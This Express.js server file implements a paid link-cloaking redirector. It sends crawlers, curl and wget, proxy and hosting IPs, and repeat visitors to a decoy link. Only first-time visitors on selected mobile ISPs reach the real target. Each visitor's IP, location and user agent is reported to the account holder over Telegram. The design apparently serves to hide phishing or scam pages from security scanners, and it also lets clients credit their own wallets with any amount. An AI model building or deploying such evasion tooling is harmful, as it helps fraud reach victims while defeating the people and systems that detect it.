const express = require('express');
require('dotenv').config();
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const bcrypt = require('bcryptjs');
const net = require('net');
const db = require('./db');

const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', true);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'", "https://api.telegram.org", "http://ip-api.com"]
        }
    },
    referrerPolicy: { policy: 'no-referrer' }
}));

app.disable('x-powered-by');

app.use(express.json());
app.use(cookieParser());
app.use(session({
    secret: process.env.SESSION_SECRET || 'saas-proxy-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production', maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.static('public'));

// --- Authentication Middleware ---
function requireAuth(req, res, next) {
    if (!req.session.userId) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
}

// --- Auth Routes ---
app.post('/api/signup', async (req, res) => {
    const { name, email, telegram, password } = req.body;
    if (!name || !email || !telegram || !password) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    const existingUser = await db.findUserByEmail(email);
    if (existingUser) {
        return res.status(400).json({ error: 'Email already registered' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await db.createUser({ name, email, telegram, password: hashedPassword });
    res.json({ message: 'Signup successful' });
});

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const user = await db.findUserByEmail(email);
    if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    req.session.userId = user.id;
    res.json({ message: 'Login successful' });
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ message: 'Logged out' });
});

app.get('/api/user', requireAuth, async (req, res) => {
    const user = await db.findUserById(req.session.userId);
    const { password, ...userWithoutPassword } = user;
    res.json(userWithoutPassword);
});

// --- Settings & Wallet Routes ---
app.post('/api/settings', requireAuth, async (req, res) => {
    const user = await db.findUserById(req.session.userId);
    const updatedUser = await db.updateUser(user.id, {
        settings: { ...user.settings, ...req.body }
    });
    res.json(updatedUser.settings);
});

app.post('/api/topup', requireAuth, async (req, res) => {
    const { amount } = req.body;
    const user = await db.findUserById(req.session.userId);
    const updatedUser = await db.updateUser(user.id, {
        wallet: user.wallet + amount
    });
    res.json({ balance: updatedUser.wallet });
});

app.post('/api/forced-ips', requireAuth, async (req, res) => {
    const { ip } = req.body;
    const user = await db.findUserById(req.session.userId);
    if (!user.forcedIps.includes(ip)) {
        await db.updateUser(user.id, { forcedIps: [...user.forcedIps, ip] });
    }
    res.json({ message: 'IP added' });
});

app.delete('/api/forced-ips/:ip', requireAuth, async (req, res) => {
    const { ip } = req.params;
    const user = await db.findUserById(req.session.userId);
    await db.updateUser(user.id, { forcedIps: user.forcedIps.filter(i => i !== ip) });
    res.json({ message: 'IP removed' });
});

// --- Proxy Redirection Logic ---
const BOT_UA_REGEX = /googlebot|bingbot|yandexbot|duckduckbot|slurp|baiduspider|facebot|ia_archiver|crawler|spider|robot|curl|wget|python|postman|insomnia|headless|screaming frog|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|exabot|petalbot/i;

function isBot(req) {
    const ua = req.headers['user-agent'] || '';
    return !ua || BOT_UA_REGEX.test(ua);
}

app.get('/u/:userId', async (req, res) => {
    const user = await db.findUserById(req.params.userId);
    if (!user || user.wallet <= 0) {
        return res.status(404).send('Not Found or Account Inactive');
    }

    const { settings, forcedIps, visitedIps } = user;
    const clientIp = req.ip;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (isBot(req)) {
        return res.redirect(settings.nonRealLink || '/');
    }

    // 1. Forced Redirect Check
    if (forcedIps.includes(clientIp)) {
        return res.redirect(settings.realLink);
    }

    // 2. Visited IP Check
    const isVisited = visitedIps.some(v => v.ip === clientIp);
    if (isVisited && !settings.reallowVisited) {
        return res.redirect(settings.nonRealLink);
    }

    // 3. IP Analysis
    let data = null;
    try {
        const response = await axios.get(`http://ip-api.com/json/${clientIp}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query`, { timeout: 5000 });
        data = response.data;
    } catch (error) {
        console.error('ISP lookup failed:', error.message);
    }

    const isProxy = data && data.proxy === true;
    const isHosting = data && data.hosting === true;
    const isSuspicious = isProxy || isHosting;

    // 4. Filtering Logic
    let targetUrl = settings.realLink;

    if (settings.antiRed && isSuspicious) {
        targetUrl = settings.nonRealLink;
    } else if (settings.ispFilter && data && data.status === 'success') {
        const userISP = (data.isp || data.org || "").toUpperCase();
        const matches = settings.mobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
        if (!matches) {
            targetUrl = settings.nonRealLink;
        }
    }

    // 5. Update Visited IPs
    if (!isVisited) {
        const newVisited = [...visitedIps, { ip: clientIp, timestamp: Date.now() }];
        await db.updateUser(user.id, { visitedIps: newVisited });
    }

    // 6. Telegram Notification (if configured)
    if (process.env.TELEGRAM_BOT_TOKEN) {
        let message = `🚀 *SaaS Visit!* (User: ${user.name})\n\n`;
        message += `📍 *IP:* ${clientIp}\n🏢 *ISP:* ${data ? data.isp : 'Unknown'}\n🌍 *Location:* ${data ? `${data.city}, ${data.country}` : 'Unknown'}\n💻 *UA:* ${userAgent}\n🎯 *Target:* ${targetUrl === settings.realLink ? 'REAL' : 'SAFE'}`;
        
        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: user.telegram, // Assuming telegram username or ID is provided
            text: message,
            parse_mode: 'Markdown'
        }).catch(() => {});
    }

    if (!targetUrl) return res.send("Configuration missing for links.");
    res.redirect(targetUrl);
});

app.listen(port, () => {
    console.log(`SaaS Proxy server running on port ${port}`);
});
